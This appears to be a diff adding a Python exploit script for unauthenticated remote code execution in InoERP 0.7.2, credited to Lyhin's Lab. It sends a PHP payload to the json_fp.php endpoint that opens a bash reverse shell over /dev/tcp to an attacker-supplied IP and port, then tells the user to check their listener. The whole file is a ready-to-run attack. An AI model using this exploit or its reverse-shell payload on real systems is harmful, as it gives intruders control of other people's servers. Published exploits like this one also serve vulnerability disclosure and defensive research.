@@ -1,0 +1,28 @@
+#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+
+# Exploit Title: InoERP 0.7.2  Unauthenticated Remote Code Execution
+# Date: March 14, 2020
+# Exploit Author: Lyhin's Lab
+# Detailed Bug Description: https://lyhinslab.org/index.php/2020/03/14/inoerp-ab-rce/
+# Software Link: https://github.com/inoerp/inoERP
+# Version: 0.7.2 
+# Tested on: Ubuntu 19
+
+import requests
+import os
+import sys
+
+if len (sys.argv) != 4:
+	print ("specify params in format: python inoerp.py target_url attacker_ip listening_port")
+else:
+        target_url = sys.argv[1]
+	attacker_ip = sys.argv[2]
+	listening_port = sys.argv[3]
+	target_url += "/modules/sys/form_personalization/json_fp.php"
+	target_headers = {"Accept": "*/*", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}
+	code = "<?php\nexec(\"/bin/bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'\");".format(attacker_ip, listening_port)
+	expl_data = {"get_fp_from_form": "true", "template_code": code, "obj_class_name": ''}
+
+	requests.post(target_url, headers=target_headers, data=expl_data)
+	print ("Check your listener.")
